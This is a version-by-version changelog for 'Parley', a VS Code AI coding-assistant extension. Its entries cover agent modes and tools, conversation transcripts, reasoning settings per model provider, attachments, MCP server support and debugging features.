- When an agent task finishes, the final message now always ends with a **SUMMARY** section (bold heading + Markdown bullet points) covering what was done, files changed, commands run / whether checks passed, and any known limitations — followed by `<DONE>`. Applies to all agent modes (ask/edit/auto/full).

## 0.40.0

### Added — complete conversation transcripts saved to `.parley`

- Parley now records a **full, ordered transcript of everything shown on screen** — your messages, the model's replies, tool activity (`⏺`/`⎿`), file-edit diffs, plans, and system notes — not just the message text.
- The canonical copy is written to a **`.parley/` folder** in your workspace as it happens:
  - `conversations/<id>.jsonl` — append-as-it-happens event log (durable; never depends on in-memory state), plus a human-readable `conversations/<id>.md` per turn.
  - `index.json` (past-conversation list) and `state.json` (Parley params: model/mode/thinking/speed).
  - A `.parley/.gitignore` (ignore-all) is created once so logs aren't committed by accident — delete it to commit them. The location can be overridden with `parley.conversationsDir`.
- **Past conversations** now reload the **full transcript** from disk (diffs, tool calls and all), not just messages — and continue appending to the same file.
- **Export** now **completes and saves the canonical transcript first, then writes a copy** in your chosen format (Markdown / plain text / JSON) to wherever you pick. The exported file contains the entire transcript.

### Fixed

- Inline **Apply** cards (Chat mode) no longer vanish when the turn ends — the chat now renders from the persisted transcript, so cards, diffs, and tool activity survive re-renders and window reloads.

### Changed

- The **context-usage ring is always visible** in the header (shows `–` when the model's context-window size is unknown).

## 0.39.0

### Fixed — agent no longer "loses its tools" and gives up mid-task

- **Root cause:** when an agent turn hit the tool-round limit, the loop made one final model call **with the tools removed** to force a text answer. Mid-task, the model correctly observed it had no tools and replied _"the tool interface became unavailable in this run"_ and stopped — then auto-continue restarted, it worked briefly, hit the wall again, and repeated. This is what made it "stop many times before finishing."
- Now, when the round limit is reached, the agent **keeps its tools and auto-continues** into the next step instead of being handed a tool-less request. The misleading "tools unavailable / can't continue in this run" message is gone.
- **`parley.maxToolRounds` default raised 25 → 50** (max 400), so long multi-file tasks cross fewer turn boundaries. Tool outputs retained per turn raised 8 → 12 to cut redundant re-reads.

### Changed — agent installs its own dependencies

- The agent system prompt now tells the agent to **install missing dependencies itself** via `run_command` (`pip install`, `npm install`, …) rather than reporting "pytest/numpy is not installed" as a blocker. It also clarifies that **"install those tools" means install the missing packages/CLIs** (not its function-calling tools, which it previously refused thinking it couldn't "enable tools"). In **Full Access** mode it's told commands run without asking, so it installs/builds/tests freely.
- The prompt also explicitly states the tools are **always available** (never claim otherwise) and that **trimmed older tool outputs are normal** (re-read if needed) — and asks the model not to paste raw reasoning notes-to-self into replies.

## 0.38.0

### Changed — tiny, platform-agnostic VSIX (esbuild bundle)

- The extension is now **bundled with esbuild** into a single `dist/extension.js`. The VSIX dropped from **~80 MB / 4264 files to ~105 KB / 14 files** and is no longer tied to the OS it was packaged on.
- The optional local‑semantic `@codebase` runtime (`@xenova/transformers` + native `onnxruntime`/`sharp`) is **no longer shipped**. The first time you build the index (`Parley: Rebuild Codebase Index`) it's installed on demand into global storage — fetching the binaries that match _your_ machine — so the platform‑specific weight only lands if you opt in. Requires `npm` on PATH for that one‑time install; falls back to lexical if unavailable.

### Added — Apply button in Chat mode

- In plain **Chat** mode, complete‑file changes the model proposes now render as an **inline diff card with an Apply / Create file and Dismiss button**, replacing the old modal pop‑ups. Clicking **Apply** writes the file (checkpointed/revertible via `Parley: Revert Last Edit`). Agent modes still apply through tools. This is the Cursor‑style "suggest in chat, apply on click" flow.

### Investigated — prompt caching (not available via Parley)

- Verified live that Anthropic `cache_control` breakpoints are **accepted but not propagated** to Bedrock by the gateway (no cache writes/reads from explicit markers, on system or user messages) — the same situation as OpenAI `reasoning_effort`. The extension therefore does **not** send them. Bedrock still applies _automatic_ prefix caching transparently. Documented in the README's gateway‑limits section.

### Internal

- New unit tests: the proposed‑change parser (`fileBlocks`) and a **bundle‑integrity** test that loads the built `dist/extension.js` and asserts it exports `activate`/`deactivate` (59 tests total). Build scripts: `compile` now typechecks (tsc) and bundles (esbuild); `package` builds a minified production bundle via `vscode:prepublish`; `watch` runs esbuild in watch mode for F5.

## 0.37.0

### Changed — complete README guide

- Rewrote `README.md` into a full user manual covering **every** feature and nuance: requirements/install/quick‑start, the chat UI tour, all six modes + the agent loop (activity `⏺`/`⎿`, live task checklist, inline diff cards), the full tool list (incl. `web_search`, `update_plan`, MCP tools), the honest **per‑provider reasoning & speed matrix** (Claude/Gemini thinking works; OpenAI `reasoning_effort` is a no‑op via Parley; Fast = `service_tier`), all `@`‑mentions, **`@codebase`** lexical vs optional on‑device semantic (MiniLM) with setup/fallback, slash + custom commands, every attachment type (image/PDF/audio/video‑via‑ffmpeg), web search, MCP servers, inline completion/edit, cost/context/usage/auto‑compaction, conversations (new/auto‑save/export md‑txt‑json/compact), git/image/editor commands, project rules, diagnostics/debug log, safety & privacy, a **full command + settings reference**, models, gateway limits, troubleshooting, and dev/packaging/architecture.
- Corrected stale notes (semantic `@codebase` is now offered; activity markers are `⏺`/`⎿`).

## 0.36.0

### Added — optional local semantic `@codebase` index (off by default)

- `@codebase` can now use a **true semantic index** powered by an **on-device MiniLM embedding model** (transformers.js / ONNX) — keyless and private, no data leaves your machine. Enable with `parley.codebaseSearch.provider: "local"` and run **`Parley: Rebuild Codebase Index`** (downloads the model ~25 MB once, then works offline). It ranks files by meaning, not just keywords.
- **Default stays `lexical`** (instant, keyless, zero added weight). The local provider is fully opt-in, lazy-loaded, and **falls back to lexical** if the index isn't built or the model can't load — so it never breaks chat.
- Note: enabling the bundle ships the embedding runtime in the VSIX (large, and platform-specific due to a native sub-dependency), which is why it's opt-in.

## 0.35.0

### Added — web search + `@codebase` retrieval (both keyless)

- **`web_search` tool** for the agent. **DuckDuckGo** is the default and needs **no API key**; **Google** (Programmable Search — set `parley.webSearch.apiKey` + `parley.webSearch.googleCx`) and **Tavily** (`parley.webSearch.apiKey`) are opt-in keyed providers. Set `parley.webSearch.provider` to `off` to disable. The agent searches, then `fetch_url`s the best results.
- **`@codebase`** mention — lexically retrieves the most relevant workspace files for your question (ripgrep-style term ranking + a filename-match boost) and adds them as context. Keyless, private, no embeddings. **On by default**, toggle with `parley.codebaseSearch.enabled`; tune count with `parley.codebaseSearch.maxFiles`.

_(A true semantic index via a bundled local embedding model is the planned next step — optional, off by default.)_

## 0.34.0

### Added — visible command execution

- Agent shell commands (`run_command`) now mirror the command and its **full output** to a dedicated **"Parley Agent"** output channel as they run (Claude-Code/Cursor-style transparency), while still capturing the output for the model and showing the `⏺`/`⎿` summary in chat.

### Note

- The Cursor-style **"Apply" button** on arbitrary chat code blocks is intentionally **not** added: it requires a dedicated apply/merge model that Parley doesn't provide, and a naive "replace file with snippet" would be destructive. Full-file edits already route through the diff-review/checkpoint flow via `File:` blocks and the `write_file`/`edit_file` tools.

This completes the Claude-Code / Codex / Cursor parity pass (custom commands, task checklist, richer @-mentions, commit messages, MCP, visible commands).

## 0.33.0

### Added — MCP (Model Context Protocol) servers

- Configure MCP servers in **`parley.mcpServers`** (stdio transport). Parley spawns each one, runs the JSON-RPC `initialize` handshake, lists its tools, and exposes them to the agent as **`mcp__<server>__<tool>`** — so the model can use external/MCP tools in the agent loop alongside the built-ins. New module `src/mcp/` with a defensive client (a server that fails to start is logged and skipped — chat keeps working) and unit-tested name mapping.
- **`Parley: Reconnect MCP Servers`** restarts them and reports status; servers also restart automatically when the config changes. MCP tools are available in every agent mode except read-only Plan mode.

## 0.32.0

### Added — Claude-Code / Codex / Cursor parity (batch 1)

- **Live task checklist.** In agent modes the model can call an `update_plan` tool; the steps render as a checklist in the chat (☐ / ▸ in-progress / ☑ done), updated in place so long runs are legible.
- **Custom slash commands.** Drop a `name.md` file in `.parley/commands/` (or `.claude/commands/`) and it becomes `/name` — the file body is the prompt, with `$ARGS` replaced by anything typed after the command. Custom commands appear in the `/` menu.
- **Richer `@`-mentions.** Besides `@file`: **`@<folder>`** attaches a folder listing, **`@git`** attaches the uncommitted diff (vs HEAD), and **`@https://…`** fetches a page's text.
- **`Parley: Generate Commit Message`.** Summarizes the staged diff (or working tree) into a Conventional Commits message and drops it into the Source Control input box.

_Next: MCP server support, an "Apply" button on chat code blocks, and visible-terminal command execution._

## 0.31.0

### Changed — future-proof Claude 4.x model support

- Investigated Claude **Opus 4.8** on Parley: it is **not available** (not in `/v1/models`; every id form — `bedrock/claude-opus-4-8`, `anthropic/…`, dated Bedrock id, `global.anthropic.*` ARN, bare — returns HTTP 400, while `opus-4-7` works). There is no undocumented id that enables it; the gateway's catalog tops out at Opus 4.7.
- Broadened the context-window, pricing, and reasoning matching to any Claude 4.x (`opus`/`sonnet`/`haiku` `4-N`), so the moment MIT adds Opus 4.8 (or another 4.x) to Parley it's fully handled — context gauge, cost estimate, and extended thinking — instead of being treated as an unknown model. Models are already listed dynamically from `/v1/models`, so it will appear in the picker automatically.

## 0.30.0

### Changed

- The one-time "reasoning isn't applied for OpenAI on Parley" hint now also fires on the **first send** of a turn when a reasoning level + an OpenAI/GPT-5 model are both active — not only when you change the level or model. This catches the common case where the level was carried over from a previous session.

## 0.29.0

### Added

- **One-time hint** when you select a reasoning level while an **OpenAI / GPT-5** model is active: a short chat note explains that Parley accepts the level but doesn't apply it for OpenAI (verified live), and suggests switching to a **Claude** or **Gemini** model for real extended reasoning. Shown once per workspace; also fires if you switch to an OpenAI model while reasoning is on.

## 0.28.0

### Changed — honest reasoning/speed labeling (after live testing)

- Live-tested the reasoning and speed parameters against the Parley API and corrected the in-product labels to match reality:
  - **Claude** extended thinking — **works** (enabling it returns a real `thinking` field and ~2–3× the reasoning tokens).
  - **Gemini** reasoning — **has an effect** (token usage changes substantially with the level).
  - **OpenAI/GPT-5.x** `reasoning_effort` — **accepted but NOT applied by Parley** (reasoning depth/latency identical across minimal→high on gpt-5-nano and gpt-5.5). The level is still sent for forward-compatibility.
  - **Fast** (`service_tier: "priority"`) — **accepted** by the gateway (HTTP 200, no error); the actual ≈1.5× speed-up depends on your account's tier.
- The Mode popover now states this so the control isn't misleading.

## 0.27.0

### Added — Speed (OpenAI service tier), like Codex

- New **Speed** control in the composer's Mode popover: **Standard** (default) or **⚡ Fast**. For OpenAI/ChatGPT models, Fast sends `service_tier: "priority"` (OpenAI's ~1.5× faster, higher-usage tier — the same "Speed" toggle Codex exposes). It's gated to OpenAI models (ignored elsewhere) and persisted per conversation; the choice is included in conversation exports. (Parley's docs don't list this parameter, so if the gateway rejects it you'll now see the stream error — it's an OpenAI-only passthrough.)

## 0.26.0

### Fixed — agent could stall during build/verify

- `run_command`'s timeout was a hard **60s**, so real `npm install` / build / test commands were killed mid-run and the agent gave up ("couldn't complete the build-and-verify cycle"). It's now **300s by default and configurable** (`parley.commandTimeoutSeconds`), with a 16 MB output buffer and a clear "exceeded timeout — re-run or split / raise the setting" message instead of a silent failure.
- The agent prompt now tells the model it is **not limited to one interaction** (it's re-invoked to continue), to treat a timed-out command as recoverable, and to always end with a final summary — so it stops apologizing about "running out of time" and bailing.

### Changed — Claude-style activity output

- Tool activity now reads like Claude Code: an **`⏺ action`** line followed by a muted **`⎿ result`** line (e.g. `⏺ Reading App.tsx` / `⎿ Read 120 lines`, `⏺ Running: npm test` / `⎿ <first output line>`). Edits still render the inline diff card.

## 0.25.0

### Added — inline diff cards for edits

- When the agent edits or writes a file, the chat now shows a **Claude-Code-style diff card** inline: an `Edit <path>` header with `+added −removed` counts, then a unified diff with a line-number gutter and **red/green** removed/added lines (context lines kept, far-apart unchanged regions collapsed). Driven by a new pure, unit-tested `formatUnifiedDiff` in `src/diff/lineDiff.ts`. Large diffs are capped (with a "diff truncated" marker).

## 0.24.0

### Added

- **Copy button on your prompts.** Each message you send now shows a copy (two-squares) icon on hover in its top-right corner — click it to copy that prompt's text back to the clipboard (handy for re-running or tweaking a prompt).

## 0.23.0

### Fixed — extended thinking is now provider-aware (root cause of the GPT-5.5 failure)

- The debug log showed `openai/gpt-5.5` with Thinking = High returning **`400 Unknown parameter: 'thinking'`**, which aborted the stream (and, before v0.21, looked like an empty response). The Anthropic-style `thinking: { type, budget_tokens }` block isn't valid for OpenAI. Each provider's reasoning is now called its own way:
  - **OpenAI** and **Google/Gemini** → `reasoning_effort` (`low`/`medium`/`high`).
  - **Claude** (Bedrock/Anthropic) → the `thinking` block + `max_tokens` (Opus 4.7 forced to adaptive).
  - **Other models** (e.g. Llama) → nothing.
    So selecting a thinking level works on every model instead of breaking OpenAI/Gemini.
- Streamed error events are now also written to the debug log (full text), not just thrown.

## 0.22.0

### Added — debug tracing

- A globally-gated debug logger (single `DEBUG` switch in `src/debug/debug.ts`, **currently on**). When enabled, verbose traces of request shapes, response metadata (`x-parley-provider`/`x-parley-model`/`x-parley-request-id`, `finish_reason`, usage), tool rounds, and turn control-flow are written to the **"Parley Debug"** output channel and to `debug/parley-debug.log` in the open workspace.
- **`Parley: Open Debug Log`** command opens that file. Secrets (API key / `Authorization`) are never logged. See `debug/README.md`.

## 0.21.0

### Fixed — silent failures (the GPT-5.5 "empty response" case)

- **Streamed errors are no longer swallowed.** Parley reports mid-stream provider failures as an SSE `error` event before `[DONE]`; the client ignored it and finished with empty content (which then showed as "empty response and took no actions"). Both streaming paths now surface it as a real error (`Parley stream error: …`), so you see the actual cause.
- **Empty model turns are logged with `finish_reason` and completion-token count** to the Parley output channel, to distinguish "model genuinely returned nothing" from a content filter / length cut-off / parse issue.

### Changed — richer conversation export

- The **export** button (and `Parley: Export Conversation`) now writes a **metadata header** — model(s) used, mode, extended-thinking level, message count, session tokens, and estimated cost.
- New **Plain text (.txt)** export format, alongside Markdown and JSON. JSON export now includes the metadata object too. Auto-saved transcripts get the same header.

## 0.20.0

### Added — conversations on disk

- **Conversations auto-save to a folder.** Every conversation is written as a Markdown file after each turn (and on compaction / starting a new one), so your history is preserved outside VS Code. Location defaults to the extension's global-storage `conversations/` folder; override with `parley.conversationsDir`, or disable with `parley.autoSaveConversations`.
- **`Parley: New Conversation`** command (in addition to the ＋ button and `/clear`) — archives & saves the current chat, then starts a fresh one.
- **`Parley: Open Conversations Folder`** command — reveals the auto-save folder in your OS file manager.

### Engineering

- Each conversation has a stable id → filename, so re-saves overwrite the same file as it grows.

## 0.19.0

### Fixed — agent behavior (closer to Claude Code)

- **No more empty assistant turns.** When the model works through tools but doesn't narrate (common with GPT-5.x), Parley now persists a Claude-Code-style activity log into the message (`⏺ Read App.tsx`, `⏺ Write src/lib/…`, `⏺ Run: npm test`) instead of leaving a blank bubble — so the conversation and exports show what actually happened.
- **No-progress breaker for auto-continue.** A step that returns no text _and_ takes no tool actions now stops immediately with a clear message, instead of looping up to the 25-step cap producing empty turns (the failure seen when building a large project with GPT-5.5).
- **Stronger narration instruction** in agent modes: the model is told to explain each action in plain text, never reply with only tool calls or an empty message, and summarize at the end before `<DONE>`.

## 0.18.0

### Added — context management (Claude Code / Codex parity)

- **Automatic compaction is now ON by default.** When a conversation reaches **80%** of the model's context window it's summarized automatically before the next turn (keeping the most recent messages verbatim), so long sessions don't overflow the context. Tune with `parley.autoCompactPercent` (set `0` to disable) or the absolute `parley.autoCompactTokens`.
- **Circular context gauge** in the header — a ring that fills as the conversation grows toward the model's context window (green → amber → red), with the percentage beside it.
- **Slash-command menu**: type `/` in the composer to get an autocomplete list (↑/↓, Enter). New commands: **`/cost`** (token/cost usage), **`/model`** (switch model), **`/init`** (create AGENTS.md), alongside `/clear`, `/compact`, `/json`, `/help`.
- **`/compact` options** — choose "summarize everything" or "summarize older, keep recent" (the ⊟ button and command prompt for this too).
- **`Parley: Init Project Rules`** command to scaffold an `AGENTS.md` rules file.

### Added — confidence & robustness

- **`Parley: Run Diagnostics`** — exercises the live gateway (models, chat, `count_tokens`, and whether **`thinking` is actually honored** on your models) and opens a pass/fail report. Image generation is not exercised (it costs money).
- **Extended-thinking capability gate** — warns when you select a thinking level for a model that doesn't support it (Llama, image models).
- **Uploaded files are cleaned up** after each request (`DELETE /v1/files/{id}`), so the account's 20-file limit isn't exhausted.

### Added — rendering

- Chat Markdown now renders **GitHub-style tables** and **blockquotes**.

### Engineering

- New pure `src/parley/models.ts` (context windows + thinking support) with tests; 38 unit tests. Marketplace publishing remains wired in the release workflow (gated on `VSCE_PAT`/`OVSX_PAT`).

## 0.17.0

### Added

- **Video attachments (via ffmpeg).** Parley has no native video type, so attaching a video (`.mp4/.mov/.mkv/.webm/.avi/…` through 📎) offers to **sample frames** (sent as images to a vision model), **extract the audio track** (sent as an `input_audio` clip on OpenAI/Google), or **both**. Frames are sampled evenly across the clip and downscaled to bound payload size. Requires `ffmpeg`/`ffprobe` on PATH (or `parley.video.ffmpegPath`); if it's missing, Parley says so and links to the download page — no crash. New settings: `parley.video.maxFrames` (12), `parley.video.frameWidth` (768), `parley.video.maxAudioSeconds` (600), `parley.video.ffmpegPath`.

### Engineering

- New `src/video/ffmpeg.ts` (frame/audio extraction) with pure, unit-tested helpers; 36 unit tests.

## 0.16.0

### Added

- **Large text files upload instead of truncate.** When an attached text/CSV/Markdown/HTML/JSON/XML file exceeds the context character cap, it's now **uploaded via `/v1/files`** (OpenAI/Google) and referenced by id so its full contents reach the model — instead of being truncated. Small files stay inline, and on Bedrock/Anthropic (no upload endpoint) files remain inline/truncated as before.
- **`Parley: Show Usage`** — fetches your account's real billed spend for the current month (`GET /v1/accounts/{accountId}/usage`): cost in USD, request count, and input/output tokens. Reads `parley.accountId` (prompted and saved on first use; find it in the Parley Admin Portal under _My Account_). This is the authoritative figure that complements the in-chat estimate.

### Engineering

- New `parley.accountId` setting; `ParleyProvider.getUsage`. 34 unit tests.

## 0.15.0

### Added

- **Audio input.** Attach a `.wav` or `.mp3` (via 📎, paste, or drag-and-drop) and it's sent as a multimodal `input_audio` block. Audio works only on OpenAI and Google models, so Parley warns if you attach audio to a Bedrock/Anthropic model. Completes multimodal support (image + PDF + audio). New pure, tested `src/parley/audio.ts`.
- **Image-generation quality.** `Parley: Generate Image` now asks for a quality (`auto` / `low` / `medium` / `high`) and passes it to `gpt-image-1`.
- **Friendlier errors** for HTTP **402** (insufficient credits/budget) and **502** (upstream provider error), per the Error Handling docs.

### Engineering

- 3 new unit tests for audio classification/gating (now 34 unit tests).

## 0.14.0

### Added

- **Exact token counting for auto-compaction.** When `parley.autoCompactTokens` is set, the conversation size is now measured with Parley's `/v1/messages/count_tokens` endpoint (exact) instead of a character heuristic, falling back to the heuristic if the endpoint is unavailable.
- **PDF attachments.** Attach a `.pdf` (via 📎, paste, or drag-and-drop) and Parley routes it correctly per provider: OpenAI/Google models **upload it to `/v1/files`** and reference it by id; Bedrock/Anthropic models receive it **inline** as a base64 `document` block. (OpenAI/Google file limits: 20 files/account, 48-hour expiry.)
- **Structured JSON output.** A new **`/json`** slash command makes the next reply a JSON object (`response_format: { type: "json_object" }`). OpenAI and Gemini use native constrained decoding; Bedrock/Anthropic are best-effort.

### Engineering

- New pure `src/parley/files.ts` (document provider routing) with tests; new `ParleyProvider.countTokens`; 31 unit tests.

## 0.13.0

### Added

- **Estimated cost.** The session counter in the chat header now shows an estimated USD cost (e.g. `· 12,345 tok · ~$0.04`) alongside tokens, accumulated per turn from the published Parley per-model rates and persisted with the conversation. Llama 4 Maverick shows `$0.00` (free); unknown models show tokens only. New pure, unit-tested `src/parley/pricing.ts`.
- **Paste & drop images.** Paste a screenshot (Ctrl/Cmd+V) or drag-and-drop an image file directly onto the composer to attach it to the next turn — no file dialog needed. The drop target highlights while dragging; oversized images (>~12 MB) are rejected with a warning.

### Engineering

- 5 new unit tests for the pricing/rate table (now 29 unit tests).

## 0.12.0

### Added

- **Extended thinking (reasoning).** Replaces the old no-op "reasoning effort" control with real support for Parley's `thinking` parameter. Choose **Off / Adaptive / Low / Med / High** from the composer's **Mode** popover (or `parley.thinking`). Enabled levels send a fixed reasoning budget (4,096 / 8,192 / 16,000 tokens) and automatically raise `max_tokens` to leave room for the answer; **Adaptive** lets the model decide. The reasoning streams live into a collapsible **💭 Thinking** panel above each reply and persists with the conversation. Supported on Claude, OpenAI reasoning models, and Gemini.
- Bedrock **Claude Opus 4.7** only supports adaptive thinking, so an "enabled" budget request to that model is transparently coerced to adaptive.
- Thinking blocks (and their signatures) are now preserved across tool-call rounds so providers that require them (Bedrock Claude) accept follow-up requests.

### Removed

- The `parley.reasoningEffort` setting and the `reasoning_effort` request parameter, which the Parley gateway does not honor. Use `parley.thinking` instead.

### Fixed

- **CI** now runs on Node 22 so `node --test`'s glob pattern expands (it was failing on Node 20, which lacks glob support in the test runner).

### Engineering

- New pure, unit-tested `src/parley/thinking.ts` (level → wire config + provider quirks); 24 unit tests.

## 0.11.0

### Added

- **Per-hunk accept/reject.** Reviewing a multi-change edit (Ask mode or `Ctrl+Alt+K` inline edit) now offers **Apply All / Choose… / Reject** — "Choose…" is a multi-select of the individual hunks, applying only the ones you pick. Built on a new pure line-diff engine (`src/diff/lineDiff.ts`).

### Engineering

- Unit tests for the line-diff/hunk engine (now 17 unit tests).
- **VS Code integration tests** (`@vscode/test-electron` + Mocha) that launch a real VS Code, activate the extension, and assert every command is registered — run in CI under `xvfb`.

## 0.10.0

### Added

- **Changed-files summary** after an agent turn ("✏️ Changed N files: …") and **`Parley: Revert All Edits`** to undo a whole turn's changes.
- **Slash commands** in the composer — `/clear`, `/compact`, `/help` — and **`Parley: Regenerate Last Response`**.
- **Auto-compaction** (`parley.autoCompactTokens`, opt-in) — summarize the conversation before a turn once it exceeds the configured token estimate, to control cost and avoid context-window errors.
- **Marketplace / Open VSX publishing** wired into the release workflow (gated on `VSCE_PAT` / `OVSX_PAT` repo secrets; no-ops until set).

### Changed / fixed

- **Stop now kills a running shell command** (the child process is aborted), not just the API request.
- **The agent loop trims stale tool outputs** automatically, so long multi-step turns stop re-sending old file dumps — cheaper and less likely to overflow context.
- **`edit_file` is whitespace-tolerant** — if an exact snippet match fails, it falls back to matching by trimmed lines (handles indentation/trailing-space differences).
- **Warns** when you attach an image to a model that likely lacks vision (Claude/Gemini/GPT-5 are vision-capable).

### Deferred

- Per-hunk accept/reject inline diff (needs a custom diff UI) and full VS Code integration tests in CI (headless-Electron infra) — noted as future work.

## 0.9.8

### Added

- **Persistent session token total** in the header (tokens used in the current conversation), updated live and reset on New/Open.
- **Token limit** per conversation — `parley.tokenLimit` and a `Parley: Set Token Limit` command. **Default `0` = unlimited.** When reached, Parley stops auto-continuing and asks you to raise it or start fresh.
- Configurable caps: `parley.maxToolRounds` (default 25) and `parley.maxAutoContinue` (default 25; `0` disables auto-continue).

## 0.9.7

### Added

- **Live elapsed timer** in the status line (e.g. `Working… (0:42) · 1,240 tokens`), ticking every second, so you always know it's alive without asking.
- **Live token counter** — the status line shows a running token count while the agent works: a real-time estimate as text streams, corrected to the exact API count (and accumulated across rounds) as each round completes.
- **Auto-continue** (agent modes): the agent now keeps working on its own until the task is complete instead of stopping for you to type "continue". It's instructed to run autonomously and signal completion with a `<DONE>` marker; the extension auto-continues up to a safety cap (and the **Stop** button always interrupts). Toggle with `parley.autoContinue` (default on).
- **"Working…" status indicator** — a pulsing status line shows while the agent is thinking or a tool is running (e.g. "Running: npm test…"), so you can tell it's busy and not stuck.
- **`edit_file` tool** — precise find-and-replace edits to existing files (reviewed/checkpointed like `write_file`), so the agent can patch large files without rewriting them.
- **Ranged `read_file`** — `start_line`/`end_line` with line-numbered output and total-line count, so the agent can page through large files.

### Changed

- Raised the per-turn tool-call limit (6 → 25) and the auto-continue cap (12 → 25); when the cap is reached the agent now posts a visible "Paused — type continue" note instead of stopping silently.
- Live activity is easier to read: blank-line spacing between narration blocks and accented action lines.
- Clarified the **Chat** mode label: "Answer only — no agent, no file access".

## 0.9.2

### Changed

- **Token-streamed agent activity** (Claude-Code style): the agent's tool rounds now stream, so the model's narration appears **token-by-token** interleaved with the action lines (`▸ Reading…`, `▸ Running…`), instead of arriving per step. Tool calls are reassembled from the streamed deltas.

## 0.9.1

### Added

- **Full access mode** (⚠ CAUTION) — auto-applies edits _and_ runs shell commands **without confirmation**. Clearly badged in the Mode popover and shown with a red caution style on the Mode button when active. All other modes still confirm shell commands.
- **Live agent activity** — while the agent works it now shows what it's doing in real time: friendly action lines (`▸ Reading src/app.ts`, `▸ Running: npm test`, `▸ Editing …`) and the model's intermediate narration between steps, Claude-Code-style.

## 0.9.0

### Added

- **Modes popover** (Cursor/Claude-style) in the composer, replacing the Agent checkbox: **Chat**, **Ask before edits**, **Edit automatically**, **Plan**, **Auto**. The reasoning-effort control moved into the same popover.
  - _Ask_ shows a diff to approve each edit; _Edit_/_Auto_ apply edits automatically (still checkpointed/revertible); _Plan_ gives the agent read-only tools and asks for a plan; _Chat_ uses no tools.
  - Shell commands (`run_command`) always require confirmation, in every mode.
- `parley.defaultMode` setting (replaces `parley.agentMode`).

## 0.8.1

### Changed

- The reasoning-effort dropdown is now explicitly labeled "not honored by Parley yet" (tooltip + dropdown header), and the setting description says the same — verified across GPT-5, Claude, and Gemini that the gateway accepts but ignores `reasoning_effort`. The parameter is still sent for forward-compatibility.

## 0.8.0

### Added

- **`search_text` agent tool** — grep file contents across the workspace (practical stand-in for semantic codebase search).
- **`@`-mention autocomplete** — typing `@` shows a file picker (↑/↓/Enter) that attaches the file as context.
- **Past conversations** — conversations are archived on "New"; reopen with 🕘 or `Parley: Open Past Conversation`.
- **Richer Markdown** — headings, lists, external links, and fenced code blocks with a hover **Copy** button.
- **Context-limit handling** — token-limit errors now suggest running Compact instead of showing a raw error.

### Engineering

- Unit tests for the new pure parsing logic (`src/parley/parsing.ts`).
- **GitHub Actions**: CI (compile + test + package on push/PR) and a Release workflow that attaches the `.vsix` to a GitHub Release on `vX.Y.Z` tags.
- ESLint + Prettier configs and `lint`/`format` scripts; removed a stale empty directory.

## 0.7.1

### Changed

- Reorganized the chat UI to be cleaner (Claude Code-like): slim header with just session actions (new/compact/export/refresh); the model and reasoning-effort pickers now live in a unified input box at the bottom alongside attach/send; context toggles tucked into a collapsible "Context" disclosure.

## 0.7.0

### Added

- **Agentic editing.** Agent mode gains `write_file` (diff-reviewed + checkpointed), `run_command` (per-command confirmation, returns output), and `fetch_url` (read a web page) on top of the existing read tools.
- **Inline edit (Ctrl+Alt+K / Cmd+Alt+K)** — `Parley: Edit Selection (Inline)`: select code, describe a change, review the diff, apply.
- **Checkpoints** — `Parley: Revert Last Edit` undoes the most recent agent/inline edit.
- **@file mentions** in the composer attach referenced files as context.
- **Project rules** — `.parleyrules` / `AGENTS.md` / `.cursorrules` in the workspace root is injected into the system prompt.
- **Persistent sessions** — the conversation and your model/effort/agent-mode choices survive reloads (per workspace).
- **Token-usage readout** under each reply (model + total tokens) when the API reports it; streaming requests now set `stream_options.include_usage`.

### Notes

- Semantic `@codebase` search is not offered: the Parley API has no `/v1/embeddings` endpoint.

## 0.6.0

### Added

- Compact the conversation: a ⊟ toolbar button and `Parley: Compact Conversation` command summarize the chat (via the selected model) and replace the history with that summary, freeing up context. Client-side feature using the normal chat endpoint — works with any model.

### Docs

- Comprehensive README covering every feature, command, and setting.
- Made the reasoning-effort caveat explicit (live testing was inconclusive; it may not currently take effect on Parley).

## 0.5.0

### Added

- Export the conversation: a ⤓ toolbar button and `Parley: Export Conversation` command save the whole chat as Markdown or JSON. Each assistant reply is tagged with the model that produced it (works across any/mixed models).

## 0.4.0

### Added

- Reasoning-effort control: `parley.reasoningEffort` setting plus an **Effort** dropdown in the chat toolbar (Default/Minimal/Low/Medium/High). Sent to the API as `reasoning_effort` for chat, agent-mode, and inline completions. Note: the Parley proxy accepts the parameter, but observable effect varies by model.

## 0.3.2

### Changed

- Redesigned the chat UI to match modern assistants (Claude/Codex): removed the uppercase USER/ASSISTANT role labels; your message is now a subtle rounded card and the reply is plain flowing text. Inline `code` renders as chips, with roomier spacing and code-block styling.

## 0.3.1

### Fixed

- Chat view showed "There is no data provider registered that can provide view data." The `parley.chatView` contribution was missing `"type": "webview"`, so VS Code treated it as a tree view and ignored the registered `WebviewViewProvider`. (Bug inherited from the original scaffold.)
- Added explicit `onView:parley.chatView` activation event.

## 0.3.0

### Added

- **Inline (ghost-text) completions** via a `vscode.InlineCompletionItemProvider` using a fast model (`parley.inlineCompletion.*` settings) and `Parley: Toggle Inline Completion`.
- **Agent mode**: an opt-in chat toggle that gives the model read-only workspace tools (`read_file`, `list_directory`, `find_files`) through an OpenAI tool-calling loop, so it can gather its own context. Edits still go through diff review; no writes or command execution.
- **File & image attachments** in the chat (📎): text files become context; images are sent as multimodal `image_url` content to vision-capable models.
- **Image generation** with `gpt-image-1` (`Parley: Generate Image`), saved to `parley-images/` and opened.
- `ParleyProvider.complete()` and `generateImage()`; `parley.agentMode` setting.
- Official Parley feather branding: a full-color extension logo (`resources/icon.png`) shown in the Extensions list/Marketplace, and a matching monochrome feather glyph for the Activity Bar.

## 0.2.0

### Added

- Implemented the real `ParleyClient` against the OpenAI-compatible MIT Parley API (`https://parley.api.mit.edu/v1`), replacing the disabled stub.
- `Parley: Set API Key` with `SecretStorage` storage and live key verification.
- Live token streaming in the chat view with Stop and New-conversation controls, Markdown/code rendering, model picker (`GET /v1/models`), and conversation history.
- Proposed edits parsed from API responses (whole-file `File:` blocks and unified diffs) flow into the existing diff-review-before-apply step; shared parser in `src/diff/extractChanges.ts`.
- `parley.stream` setting; updated `parley.endpoint`/`parley.defaultAgent` defaults to the live API and a real model.

### Changed

- The official API is now the only provider; editor commands (ask, explain, refactor, generate tests, fix diagnostics) stream their replies into the chat panel instead of a truncated popup.
- Replaced API discovery notes with a real API reference.

### Removed

- Removed the legacy "no API" workaround layer: the clipboard/website handoff commands (`Copy Prompt for Website`, `Copy Repository Context for Website`, `Import Website Response`), the `Manual Login Workflow`, the `Open MIT Parley Website` command, the `parley.websiteUrl` setting, and the offline mock provider.

## 0.1.0

- Initial VS Code extension scaffold.
- Added Parley activity-bar chat view.
